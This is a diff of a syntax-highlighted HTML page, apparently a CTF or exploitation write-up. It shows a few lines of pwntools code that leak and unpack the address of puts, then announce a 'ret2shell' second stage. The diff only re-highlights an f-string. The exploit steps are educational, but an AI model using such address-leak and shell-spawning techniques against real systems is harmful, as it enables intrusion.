@@ -500,7 +500,7 @@ raw_data <span style="color:#f92672">=</span> raw_data[<span style="color:#f9267
 
 leaked_puts <span style="color:#f92672">=</span> raw_data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># fill missing bytes with zeroes</span>
 leaked_puts <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>u64(leaked_puts)
-pwn<span style="color:#f92672">.</span>success(f<span style="color:#e6db74">&#39;Leaked puts: {leaked_puts:x}&#39;</span>)
+pwn<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Leaked puts: </span><span style="color:#e6db74">{</span>leaked_puts<span style="color:#e6db74">:</span><span style="color:#e6db74">x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
 
 
 pwn<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Stage 2, ret2shell&#34;</span>)
